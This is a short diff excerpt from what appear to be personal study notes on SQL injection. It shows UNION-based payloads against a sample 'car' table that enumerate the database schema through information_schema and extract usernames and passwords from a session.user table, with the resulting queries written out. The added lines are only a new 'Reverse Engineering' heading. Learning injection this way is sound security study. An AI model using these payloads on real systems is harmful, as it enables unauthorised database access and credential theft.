@@ -167,3 +167,6 @@ select name, type, cost, color, year from car where name='audi\' or 1=\'1'
 6. Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #      ----> GOLDEN STATEMENT ALLOWS US TO KNOW WHAT TO WRITE FOR THAT SITUATION. Helps us to write a valid query for content
 7. Audi' Union select id,null,name,pass,null from session.user; #
 query -----> select name, type, cost, color, year from car where name='Audi' Union select id,2,name,pass,null from session.user; #'
+
+
+## REVERSE ENGINEERING ##
